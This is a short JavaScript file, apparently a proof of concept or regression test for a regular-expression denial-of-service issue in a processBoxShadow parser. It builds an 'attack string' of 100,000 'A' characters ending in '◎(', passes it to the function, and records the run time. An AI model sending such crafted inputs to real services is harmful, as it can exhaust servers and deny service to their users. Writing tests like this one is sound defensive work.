import processBoxShadow from "./processBoxShadow.js";

//Attack String :""+"A"*100000+"◎("
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "A";
}
str += "◎(";

console.log(processBoxShadow(str));

// real    0m0.230s
// user    0m0.116s
// sys     0m0.011s
